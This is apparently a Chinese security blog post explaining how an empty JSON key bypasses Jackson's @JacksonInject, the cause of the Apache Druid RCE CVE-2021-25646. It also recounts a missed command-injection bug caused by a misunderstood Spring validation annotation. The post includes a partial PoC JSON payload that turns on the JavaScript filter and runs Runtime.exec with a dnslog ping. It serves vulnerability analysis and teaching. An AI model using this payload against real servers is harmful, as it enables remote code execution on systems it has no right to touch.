---
layout:     post
title:      "误解注解产生的漏洞"
subtitle:   ""
date:       2021-04-10 13:14:00
author:     "kuron3k0"
header-img: "img/post-bg-rwd.jpg"
tags:
    - Java
---



最近发现一个挺有意思的漏洞`CVE-2021-25646`，从一个看似不可能的地方完成了命令执行，联想到之前测一个产品的时候我也因为误解了注解含义的原因漏掉了一个RCE，这里拿来分享一下。



## Jackson注解的一个trick

首先说一下什么是`Jackson`，它和`FastJson`一样，是java里面的一个处理Json的库，高性能且稳定、流行度高、容易使用、Spring的默认Json解析器，而且默认情况下很多反序列化的漏洞都利用不了，不像`FastJson`一样，因此安全性也比较高。

其实这个漏洞的根本原因是`Jackson`处理Json的一个机制。

写了一个demo

```java
public class User {

    public  String username;

    public String password;

    public String isAdmin="false";

    @JsonCreator
    public User(
            @JsonProperty("username") String username,
            @JsonProperty("password") String password,
            @JacksonInject String isAdmin){
        this.isAdmin=isAdmin;
        this.username=username;
        this.password=password;
    }

    @Override
    public String toString(){
        return this.username+"/"+this.password+"/"+this.isAdmin;
    }
}
```

现在有一个User类，然后属性是用户名、密码、是否管理员（默认为False），这里用了三个Jackson的注解，大概说一下都是什么意思。

- @JsonCreator

    > We can use the @JsonCreator annotation to tune the constructor/factory used in deserialization.
  
    可以加在构造函数上面用于反序列化

-  @JsonProperty

    > We can add **the *@JsonProperty* annotation to indicate the property name in JSON**.

    指定Json里的key对应的属性

- @JacksonInject

    > **@JacksonInject indicates that a property will get its value from the injection and not from the JSON data.**

    指定对应属性不能从Json中获取

所以按照描述，上述User类中的`isAdmin`属性是用户不可控的

构造如下Json字符串，并用`Jackson`解析

```java
public class Test {
    public static void main(String[] args) throws Exception{
        String json = "{\"username\":\"admin\",\"password\":\"1234\",\"\":true}";
        ObjectMapper mapper = new ObjectMapper();
        User user  = mapper.readValue(json, User.class);
        System.out.println(user);

    }
}
```

Console输出

```shell
admin/1234/true

Process finished with exit code 0

```

可以看到`idAdmin`字段已经被设为`true`，为什么Json字符串里的空键值会赋值给`isAdmin`？这就跟`Jackson`的处理逻辑有关了

调用`readValue`后，进入到`_deserializeUsingPropertyBased`函数，这里循环处理我们的键值对，当前正在处理空键值，`propName`为空

![](/img/in-post/misunderstanding-annotation/1.png)



根据`propName`会去`_propertyLookup`中取出对应的`creator property`，从名字也能看出来，这个就是我们之前的注解生成的，`username`和`password`都有对应同名字的键值，但是标注了`@JacksonInject`的`isAdmin`的键值为空

![](/img/in-post/misunderstanding-annotation/2.png)



随后调用`_deserializeWithErrorWrapping`反序列化得到对应的值，并赋值给`buffer`中的`_creatorParameters`，下面是`username`的赋值

![](/img/in-post/misunderstanding-annotation/4.png)
![](/img/in-post/misunderstanding-annotation/6.png)



当处理完所有键值对后，取出`_creatorParameters`调用`User`的构造函数

![](/img/in-post/misunderstanding-annotation/3.png)



最后我们得到了一个`admin`权限的用户

![](/img/in-post/misunderstanding-annotation/5.png)



## CVE-2021-25646

所以这个洞就是利用了这个特性产生的RCE。

定位到关键类`JavascriptDimFilter`

```java
@JsonCreator
public JavascriptDimFilter(
	@JsonProperty("dimension") String dimension,
    @JsonProperty("function") String function,
    @JsonProperty("extractionFn") @Nullable ExtractionFn extractionFn,
    @JsonProperty("filterTuning") @Nullable FilterTuning filterTuning,
    @JacksonInject JavascriptConfig config
)
```

存在一个`@JacksonInject`注解，所以这个`JavascriptConfig`是用户可控的，攻击者可以把默认禁止的javascript打开，最后调用javascript引擎执行java代码，下面是poc的一部分，可以看到利用空键值把`enabled`设置为`true`了

```json
  "transformSpec":{
    "transforms":[],
    "filter":{
        "type":"javascript",
        "dimension":"added",
        "function":"function(value) {java.lang.Runtime.getRuntime().exec('ping dnslog')}",
        "":{
            "enabled":True
        }
    }
  }
```

具体漏洞调用流程有兴趣的大佬可以自己调一下



## 再来看看产品的一个漏洞

有这么一个删除路由的接口

```java
@DeleteMapping("/networkRoute")
@CheckValidateAble
public ApiResponse deleteNetworkRoute(@Validated @RequestBody NetworkRouteDTO networkRouteDTO, HttpServletRequest request)
        throws ValidateException, IOException, NetworkSettingsException {
    /*
    
    code to rce
    
    */
}
```

只要能通过`@Validated`和`@CheckValidateAble`的验证，`networkRouteDTO`中的参数就可以插到命令中导致RCE

先看看`networkRouteDTO`

```java
@Data
public class NetworkRouteDTO implements ValidateAble {
    private List<NetworkRoute> networkRouteList;

    @Override
    public void validate() throws ValidateException {
    }
}
```

这是`networkRoute`的定义

```java
@Data
@AllArgsConstructor
@NoArgsConstructor
@ToString
public class NetworkRoute implements ValidateAble {

    @Min(value = METRIC_MIN_VALUE, message = "network.networkRoute.Metric.notes")
    @Max(value = METRIC_MAX_VALUE, message = "network.networkRoute.Metric.notes")
    private Integer metric;

    @Size(max = NetworkConstants.NetworkCommonAttribute.INTERFACE_NAME_LENGTH, message = "network.networkInterface.name.notes")
    @NotNull(message = "network.networkInterface.name.notes")
    private String interfaceName;

  

    @Override
    public void validate() throws ValidateException {

        /*
        
        correct validation

        */
    }

}

```



当时审的时候，虽然看到`networkRouteDTO`的`validate`函数是空的，但是因为记忆中`@Validated`是可以嵌套验证的，所以就理所当然的认为`networkRouteDTO`中的`List<NetworkRoute>`也会调用`validate`进行校验，而`networkRoute`的`validate`对参数是做了限制的，所以就漏掉了这个洞



但是实际上这个`validate`函数是通过`@CheckValidateAble`生效的

```java
@Aspect
public class ValidateAspect {

    @Pointcut("@annotation(com.xxx.CheckValidateAble)")
    private void validateParametersPointCut() {
    }

    @Before("validateParametersPointCut()")
    public void validateParametersAdvice(JoinPoint joinPoint) throws ValidateException {
        Object[] args = joinPoint.getArgs();
        for (Object arg : args) {
            if (arg instanceof ValidateAble) {
                ((ValidateAble) arg).validate();
            }
        }
    }

}
```

可以看到当注解的参数为`ValidateAble`的实例的话，则调用其`validate`函数，与`@Validated`并无关系，所以`networkRouteDTO`仅仅会调用他自己的空校验函数，



那我记忆中的嵌套验证和`validate`是哪里来的呢？

还是来举个例子，上面的`User`类仿照`networkRouteDTO`加上了一个`Hacker`的`List`，把`Hacker`套在`User`里面

```java
public class User {

    public  String username;

    public String password;

    public String isAdmin="false";

    public List<Hacker> hacker;

    public User(String username,String password,String isAdmin,List<Hacker> hacker){
        this.isAdmin=isAdmin;
        this.username=username;
        this.password=password;
        this.hacker=hacker;
    }

	@Override
    public String toString(){
    	return this.username+"/"+this.password+"/"+this.hacker.get(0).getId();
	}

}
```

`Hacker`类，这里限制了`id`必须在1~100之间

```java
public class Hacker {

    @Range(message = "range from 1 to 100", min = 1, max = 100)
    int id;

    public void setId(int i){
        this.id=i;
    }
    public int getId(){
        return this.id;
    }
}

```

但是似乎限制没有生效
![](/img/in-post/misunderstanding-annotation/7.png)

因为这里需要在`User`中需要做校验的属性前加上`@Valid`才能实现嵌套验证

```java
@Valid
public List<Hacker> hacker;
```

超过范围直接报错了
![](/img/in-post/misunderstanding-annotation/8.png)

不大于100则正常运行
![](/img/in-post/misunderstanding-annotation/9.png)



而`validate`函数大概是继承`org.springframework.validation.Validator`并重载`validate`实现的。同时继承`javax.validation.ConstraintValidator`重载`isValid`也可以实现一样的效果，但是注解就不是用`@Validated`了，这里就不再展开了



有时学东西学个大概是很致命的，像在这里这个似是而非的`validate`就误导我认为没有漏洞了，在这里做个警醒，以后都要了解原理才行



## 参考

[http://unclechen.github.io/2018/12/15/SpringBoot%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/](http://unclechen.github.io/2018/12/15/SpringBoot%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/)

[https://sec.thief.one/article_content?a_id=78791463a276e23533d65f71c15787fc](https://sec.thief.one/article_content?a_id=78791463a276e23533d65f71c15787fc)